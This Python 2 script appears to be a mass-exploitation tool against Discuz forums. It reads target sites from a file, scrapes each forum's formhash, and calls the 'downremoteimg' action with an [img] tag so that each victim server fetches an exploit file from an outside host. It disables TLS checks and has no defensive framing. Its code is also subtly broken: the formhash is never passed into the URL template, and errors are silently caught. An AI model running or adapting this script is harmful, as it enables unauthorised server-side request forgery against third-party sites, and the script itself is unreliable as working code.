#!/usr/bin/env python
# encoding: utf-8
import urlparse
import random
import time
import re
import requests
#from utils.fileutils import FileUtils
import requests.packages.urllib3
requests.packages.urllib3.disable_warnings()

fobj = open('discuz.txt','r')
for website in fobj:
    request = requests.session()
    try:
        forumurl = "{website}/forum.php".format(website=website)
        response = request.get(forumurl, timeout=5, verify=False)
        formhash = re.findall(r'formhash" value="(.*?)"',response.content)
        netloc = urlparse.urlparse(website).netloc
        payload = 'http://www.catssec.com/exp/exploit.php'.format(netloc=netloc)
        url = "{website}/forum.php?mod=ajax&action=downremoteimg&formhash={formhash}&message=[img]{payload}[/img]".format(
            website=website,
            payload=payload)
        response = request.get(url, timeout=5, verify=False)
        #print url, len(response.content)
    except Exception, e:
        print website, e
